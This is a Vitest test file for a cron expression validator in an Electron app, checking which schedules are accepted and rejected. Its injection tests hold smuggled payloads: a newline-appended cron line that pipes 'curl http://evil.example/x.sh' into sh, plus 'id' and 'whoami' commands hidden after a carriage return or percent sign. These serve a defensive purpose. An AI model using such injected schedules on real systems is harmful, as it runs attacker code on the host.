import { describe, it, expect } from 'vitest';
import { isValidCronExpression } from '../../../electron/utils/cron-parser';

// The contract is deliberately "reject what is unsafe, plus what `crontab -`
// itself rejects" — nothing stricter. Every expectation below was cross-checked
// against `crontab -n` on Debian cron; being stricter than the real parser would
// break schedules that used to work.

describe('isValidCronExpression', () => {
  it('accepts numeric expressions', () => {
    // given -> when -> then
    expect(isValidCronExpression('*/15 * * * *')).toBe(true);
    expect(isValidCronExpression('0 9 * * 1-5')).toBe(true);
    expect(isValidCronExpression('5,10,15 */2 * * *')).toBe(true);
    expect(isValidCronExpression('1-10/2 * * * *')).toBe(true);
    expect(isValidCronExpression('0 0 * * 7')).toBe(true);
    expect(isValidCronExpression('  0   9   *   *   *  ')).toBe(true);
  });

  it('accepts named months and weekdays', () => {
    // given -> when -> then
    expect(isValidCronExpression('0 9 * * MON-FRI')).toBe(true);
    expect(isValidCronExpression('0 9 * * mon')).toBe(true);
    expect(isValidCronExpression('0 0 1 1 sun')).toBe(true);
    expect(isValidCronExpression('* * * JAN-MAR *')).toBe(true);
  });

  it('accepts @-macros', () => {
    // given -> when -> then
    expect(isValidCronExpression('@daily')).toBe(true);
    expect(isValidCronExpression('@reboot')).toBe(true);
    expect(isValidCronExpression('@weekly')).toBe(true);
  });

  it('accepts wrapping and descending ranges, which cron itself allows', () => {
    // given -> when -> then
    expect(isValidCronExpression('0 9 * * FRI-MON')).toBe(true);
    expect(isValidCronExpression('5-1 * * * *')).toBe(true);
  });

  it('rejects newline injection', () => {
    // given
    const injected = '0 9 * * *\n* * * * * curl http://evil.example/x.sh | sh';

    // when -> then
    expect(isValidCronExpression(injected)).toBe(false);
    expect(isValidCronExpression('0 9 * * *\r* * * * * id')).toBe(false);
  });

  it('rejects a percent sign, which cron treats as end-of-command', () => {
    // given -> when -> then
    expect(isValidCronExpression('0 9 * * *%whoami')).toBe(false);
  });

  it('rejects the wrong number of fields', () => {
    // given -> when -> then
    expect(isValidCronExpression('0 9 * *')).toBe(false);
    expect(isValidCronExpression('0 9 * * * *')).toBe(false);
    expect(isValidCronExpression('')).toBe(false);
  });

  it('rejects out-of-range values', () => {
    // given -> when -> then
    expect(isValidCronExpression('60 * * * *')).toBe(false);
    expect(isValidCronExpression('* 24 * * *')).toBe(false);
    expect(isValidCronExpression('* * 0 * *')).toBe(false);
    expect(isValidCronExpression('* * * 13 *')).toBe(false);
    expect(isValidCronExpression('* * * * 8')).toBe(false);
  });

  it('rejects malformed steps and names in the wrong field', () => {
    // given -> when -> then
    expect(isValidCronExpression('*/0 * * * *')).toBe(false);
    expect(isValidCronExpression('a * * * *')).toBe(false);
    expect(isValidCronExpression('1/2/x * * * *')).toBe(false);
    // A step only qualifies '*' or a range — cron rejects a bare "5/10".
    expect(isValidCronExpression('5/10 * * * *')).toBe(false);
    // Month names are not valid in the minute field.
    expect(isValidCronExpression('JAN * * * *')).toBe(false);
  });
});
